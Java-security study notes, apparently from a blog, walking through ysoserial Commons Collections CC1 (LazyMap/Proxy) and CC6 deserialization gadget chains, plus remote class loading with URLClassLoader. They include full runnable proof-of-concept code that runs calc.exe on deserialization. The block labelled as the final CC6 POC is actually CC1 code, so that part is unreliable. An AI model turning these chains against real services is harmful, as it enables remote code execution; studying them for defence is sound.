<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>与<code>TransformedMap</code>同样不同还在反序列化的readObject过程中。yso通过<code>invoke</code>方法来调用<code>LazpMap</code>的get方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">    String var4 = var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span> var7 = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">switch</span>(var4.hashCode()) &#123;</span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1776922004</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">147696667</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1444986633</span>:</span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">                var7 = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            Object var6 = <span class="keyword">this</span>.memberValues.get(var4); <span class="comment">//此处触发get方法</span></span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(<span class="keyword">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="keyword">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是我们如何调用<code>AnnotationInvocationHandler</code>方法的<code>invoke</code>方法又是一个问题。</p>
<h2 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h2><p>通过Proxy我们获得的Map，在调用任何方法之前都会先调用<code>(InvocationHandler)hanlder</code>的<code>invoke</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, handler);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220308173933.png"><br><code>AnnotationInvocationHandler</code>是一个实现了<code>InvocationHandler</code>类。</p>
<p>我们先将在<code>TransformedMap</code>中的恶意<code>AnnotationInvocationHandler</code>作为proxy的第三个参数，得到一个新的map。该map调用任何方法都会调用<code>invoke</code>方法，从而调用<code>get</code>方法。<br>将代理后的map类，封装成一个新的<code>AnnotationInvocationHandler</code>，在readObject中有许多调用该map的方法。</p>
<p>最后的调用链条为<br>AnotationInvcationHanlder.readObject() // 该<code>Hanlder</code>带有一个 拥有proxy的map<br>    Map(proxyz).entrySet()     //调用该map方法<br>        AnotationInvocationHanlder.invoke()    //使用代理的invoke方法<br>            LazyMap.get()    //调用了代理中的LazyMap的get方法<br>                transform()    //调用transform方法</p>
<p>最后的类之间的关系<br>    最后的类的包含关系</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span>  <span class="title">CC1LazyMap</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class , Class[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class , Object[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]</span><br><span class="line">                                &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span></span><br><span class="line">                ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;valueassfa&quot;</span> ,<span class="string">&quot;xxxxjl&quot;</span>);</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        outerMap.get(<span class="string">&quot;sdfsfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        handler = (InvocationHandler) constructor.newInstance(Retention.class, proxymap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>CC1</tag>
        <tag>ysoserial</tag>
      </tags>
  </entry>
  <entry>
    <title>java漫谈笔记-反序列化篇-CC6</title>
    <url>/2022/03/10/java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-CC6/</url>
    <content><![CDATA[<h1 id="java漫谈笔记-反序列化篇-CC6"><a href="#java漫谈笔记-反序列化篇-CC6" class="headerlink" title="java漫谈笔记-反序列化篇-CC6"></a>java漫谈笔记-反序列化篇-CC6</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>文章为phith0n<a href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈部分部分内容摘抄与阅读笔记。</p>
<span id="more"></span>

<p>在yso中cc6的利用链如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">           java.util.HashSet.readObject()</span><br><span class="line">               java.util.HashMap.put()</span><br><span class="line">               java.util.HashMap.hash()</span><br><span class="line">                   org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                   org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                       org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                           org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                           org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                           java.lang.reflect.Method.invoke()</span><br><span class="line">                               java.lang.Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过使用<code>TiedMapEntry</code>的<code>getValue</code>方法，调用LazyMap的get方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>而用通过<code>TiedMapEntry</code>的<code>hashCode</code>方法来调用<code>getValue</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>为了方便，我们不使用<code>HashSet</code>.而是与最开始的<code>URLDNS</code>相同，使用<code>HashMap</code>反序列化中<code>readObject</code>的最后的<code>Put</code>中有<code>hashCode</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        K key = (K) s.readObject();</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        V value = (V) s.readObject();</span><br><span class="line">    putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接着把序列化链构造出来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc6;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        Transformer [] fakeTransformer = <span class="keyword">new</span> Transformer[] &#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformer);</span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outermap = LazyMap.decorate(innermap, transformerChain);</span><br><span class="line">        TiedMapEntry tem  =<span class="keyword">new</span> TiedMapEntry(outermap, <span class="string">&quot;keykey&quot;</span>) ;</span><br><span class="line">        HashMap exp = <span class="keyword">new</span> HashMap();</span><br><span class="line">        exp.put(tem , <span class="string">&quot;xyz&quot;</span>);</span><br><span class="line">		<span class="comment">//最后将恶意链放入</span></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(transformerChain , transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(exp);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span></span><br><span class="line">                ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行后发现没有弹出计算器。<br>调试后发现在<code>LazyMap</code>的<code>get</code>方法中map以及包含了”keykey”这个键值。无法进入transform方法。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220310075005.png"></p>
<p>当给TiedMap初始化之后，它会自己将<code>key</code>传入LazyMap所以我们在最后删除LazyMap中的<code>key</code>即可。</p>
<p>最后完整的POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span>  <span class="title">CC1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Runtime.getRuntime();</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class , Class[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class , Object[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> Object[]</span><br><span class="line">            &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span></span><br><span class="line">                ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span> ,<span class="string">&quot;xxxxjl&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,</span><br><span class="line">        transformerChain);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = constructor.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>ysoserial</tag>
        <tag>CC6</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA安全漫谈-字节码</title>
    <url>/2022/03/15/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    <content><![CDATA[<h1 id="JAVA安全漫谈-字节码"><a href="#JAVA安全漫谈-字节码" class="headerlink" title="JAVA安全漫谈-字节码"></a>JAVA安全漫谈-字节码</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>文章为phith0n<a href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈部分部分内容摘抄与阅读笔记。</p>
<span id="more"></span>
<h2 id="“字节码”是什么"><a href="#“字节码”是什么" class="headerlink" title="“字节码”是什么"></a>“字节码”是什么</h2><p>我在Shiro反序列化和java木马中都可以看到字节码。但是一直不知道字节码是什么，但是单独听名字我认为字节码是在程序中传递一个直接数组。这个字节数组是可以直接在java中运行的。查看资料后我发现字节码差不多是这个意思。</p>
<p>Java之所以可以“一次编译，到处运行”，一是因为JVM针对各种操作系统、平台都进行了定制，二是因为无论在什么平台，都可以编译生成固定格式的字节码（.class文件）供JVM使用。因此，也可以看出字节码对于Java生态的重要性。之所以被称之为字节码，是因为字节码文件由十六进制值组成，而JVM以两个十六进制值为一组，即以字节为单位进行读取。</p>
<blockquote>
<p><a href="https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html">https://tech.meituan.com/2019/09/05/java-bytecode-enhancement.html</a></p>
</blockquote>
<h2 id="URLClassLoader-加载远程class文件"><a href="#URLClassLoader-加载远程class文件" class="headerlink" title="URLClassLoader 加载远程class文件"></a>URLClassLoader 加载远程class文件</h2><p>使用URLClassLoader路径有三种情况</p>
<ul>
<li>URL未以斜杠<code>/</code>结尾，则认为是一个JAR文件，使用<code> JarLoader</code> 来寻找类，即为在Jar包中寻找.class文件</li>
<li>URL以斜杠<code>/</code>结尾，且协议名是 file ，则使用 <code>FileLoader</code> 来寻找类，即为在本地文件系统中寻<br>找.class文件</li>
<li>URL以斜杠<code> /</code> 结尾，且协议名不是 file ，则使用最基础的 <code>Loader</code> 来寻找类</li>
</ul>
<p>非<code>file</code>协议最经典的就是http协议.</p>
<p>我简单的测试一下，java是否可以从远程服务器上读取.class文件<br>main.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> bytecode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            URL[] urls = &#123;<span class="keyword">new</span> URL(<span class="string">&quot;http://***.***.***.***:80/&quot;</span>)&#125;;</span><br><span class="line">            URLClassLoader loader = URLClassLoader.newInstance(urls);</span><br><span class="line">            System.out.println(<span class="number">2134</span>);</span><br><span class="line">            Class C = loader.loadClass(<span class="string">&quot;bytecode.Hello&quot;</span>);</span><br><span class="line">            System.out.println(<span class="number">11112134</span>);</span><br><span class="line">            C.newInstance();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Hello.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> bytecode;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is static &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is  construct &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220314171759.png"></p>
<p>这里我遇到两个坑，idea自动往Hello.java 是在 pacakage 包中，因此Hello.class文件也要放在bytecode文件夹中。不然会报<code>NoClassDefFoundError</code>异常。</p>
<h2 id="classLoader-defineClass加载字节码"><a href="#classLoader-defineClass加载字节码" class="headerlink" title="classLoader#defineClass加载字节码"></a><code>classLoader#defineClass</code>加载字节码</h2><p>不管是远程加载class文件，还是加载本地class文件，都会经过下面三个方法.</p>
<p>ClassLoader#loadClass-&gt;ClassLoader#findClass-&gt;ClassLoader#defineClass</p>
<ul>
<li><code>loadClass</code>就是双亲委派机制</li>
<li><code>findClass</code>根据指定的URL加载字节码</li>
<li><code>defineClass</code>是将字节码转换为java类的真正操作。</li>
</ul>
<p>也就是说java加载字节码的关键在于<code>defineClass</code>操作</p>
<p>下面是使用<code>defineClass</code>加载字节码</p>
